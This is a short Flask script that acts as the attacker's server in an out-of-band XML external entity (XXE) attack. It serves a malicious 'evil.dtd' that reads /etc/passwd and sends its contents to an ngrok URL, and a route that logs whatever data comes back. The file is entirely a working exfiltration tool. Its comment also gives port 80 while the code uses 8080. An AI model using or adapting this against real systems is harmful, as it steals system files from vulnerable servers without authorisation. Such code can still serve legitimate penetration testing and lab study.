from flask import Flask, request

app = Flask(__name__)


@app.route("/")
def capture():
    # Capture the 'data' query parameter from the URL
    data = request.args.get("data", "")
    print(f"Captured data: {data}")
    return "OK"


@app.route("/evil.dtd")
def serve_dtd():
    # Serve the evil.dtd file that will be included in the malicious XML
    return """<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send SYSTEM 'https://cb56-180-245-182-49.ngrok-free.app/?collect=%file;'>
%send;"""


# Run Flask on port 80 to receive requests from the vulnerable server
app.run(host="0.0.0.0", port=8080)
